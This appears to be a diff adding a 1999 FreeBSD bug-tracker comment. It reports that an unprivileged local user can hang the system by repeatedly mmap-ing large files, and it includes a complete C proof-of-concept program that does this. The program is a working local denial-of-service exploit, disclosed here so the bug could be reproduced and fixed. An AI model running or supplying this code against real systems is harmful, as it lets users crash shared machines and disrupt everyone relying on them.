@@ -1,0 +1,8 @@
+{
+ "id": 44478,
+ "bug_id": 14614,
+ "attachment_id": 0,
+ "creation_time": "1999-10-31T00:10:00Z",
+ "creator": "sobomax@altavista.net",
+ "text": "Any unpriveleged user with shell access and 10-20MB of disk quiota\ncan hang FreeBSD machine using following program. This program is simply \nmmap'ing large files without unmap'ing them. I have not found a way to\nprevent this attack neither using disk quotas nor using memory limits in\nlogin.conf.\n\nI'm personally tested it works on 4.0, however others reports that 3.3\nis also affected.\n\nHow-To-Repeat: #include \u003csys/types.h\u003e\n#include \u003csys/mman.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003cerrno.h\u003e\n\nmain()\n{\n    int fd;\n    int i;\n    int len=1024*1024*10;  /*ie 10Mbytes*/\n    caddr_t addr;\n    char ttt[80];\n\n    for (i=0;;i++)\n    {\n    sprintf (ttt,\"%d\",i);\n    fd=open(ttt,O_CREAT|O_RDWR,0666);\n    if (fd\u003c0)\n    {\n        printf(\"open error %ld\\n\",errno);\n        exit(1);\n    }\n    lseek(fd,len-1,SEEK_SET);\n    write(fd,\"\",1);\n    addr=mmap(0,len,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);\n    if (addr==MAP_FAILED)\n    {\n        printf(\"mmap error %ld\",errno);\n        exit(1);\n    }\n    close(fd);\n    memset(addr,'x',len);\n    }\n}"
+}
